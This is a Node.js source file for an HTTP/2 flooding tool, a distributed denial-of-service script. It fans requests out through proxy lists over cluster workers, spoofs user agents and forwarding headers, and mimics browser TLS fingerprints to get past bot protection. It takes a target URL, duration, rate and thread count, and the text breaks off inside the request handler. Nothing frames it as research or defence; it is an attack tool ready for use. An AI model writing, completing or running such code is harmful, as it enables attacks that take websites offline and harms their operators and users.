const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.error(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 1000 300 20`);
    process.exit(1);
}

const [,, targetUrl, time, reqPerSec, threads] = process.argv;
const parsedTarget = url.parse(targetUrl);

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = 'GREASE:' + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3),
].join(':');

const sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';

const ecdhCurve = 'GREASE:x25519:secp256r1:secp384r1';

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = 'TLS_client_method';

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol,
};

const secureContext = tls.createSecureContext(secureContextOptions);

const proxyFile = path.resolve(__dirname, 'proxy.txt');
const uaFile = path.resolve(__dirname, 'ua.txt');

const proxies = readLines(proxyFile);
const userAgents = readLines(uaFile);

const args = {
    target: targetUrl,
    time: parseInt(time, 10),
    rate: parseInt(reqPerSec, 10),
    threads: parseInt(threads, 10),
};

if (isNaN(args.time) || isNaN(args.rate) || isNaN(args.threads) || args.threads <= 0) {
    console.error('Invalid arguments. TIME, REQ_PER_SEC, and THREADS must be positive integers.');
    process.exit(1);
}

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died with code: ${code}, signal: ${signal}`);
    });
} else {
    setInterval(runFlooder, 1000 / args.rate);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(':');
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on('connect', () => {
            connection.write(buffer);
        });

        connection.on('data', (chunk) => {
            const response = chunk.toString('utf-8');
            const isAlive = response.includes('HTTP/1.1 200');
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, 'error: invalid response from proxy server');
            }
            return callback(connection, undefined);
        });

        connection.on('timeout', () => {
            connection.destroy();
            return callback(undefined, 'error: timeout exceeded');
        });

        connection.on('error', (error) => {
            connection.destroy();
            return callback(undefined, `error: ${error.message}`);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error(`Error reading file ${filePath}: ${error.message}`);
        process.exit(1);
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let output = '';
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

const headers = {
    ':method': 'GET',
    ':path': parsedTarget.path,
    ':scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'accept-language': 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'accept-encoding': 'gzip, deflate, br',
    'x-forwarded-proto': 'https',
    'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
    'sec-ch-ua-mobile': randomElement(['?0', '?1']),
    'sec-ch-ua-platform': randomElement(['Android', 'iOS', 'Linux', 'macOS', 'Windows']),
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
};

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(':');

    headers[':authority'] = parsedTarget.host;
    headers['user-agent'] = randomElement(userAgents);
    headers['x-forwarded-for'] = parsedProxy[0];

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1], 10),
        address: parsedTarget.host + ':443',
        timeout: 15,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.error(error);
            return;
        }

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823,
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.on('secureConnect', () => {
            const client = http2.connect(parsedTarget.href, {
                protocol: 'https:',
                settings: settings,
                maxSession: 10000,
            });

            client.on('error', (err) => {
                console.error('HTTP/2 Client Error:', err.message);
            });

            const request = client.request(headers);

            request.on('response', (headers) => {
                // Handle response headers if needed
            });

            request.on('data', (chunk) => {
                // Handle response data if needed
            });

            request.on('end', () => {
                client.close();
            
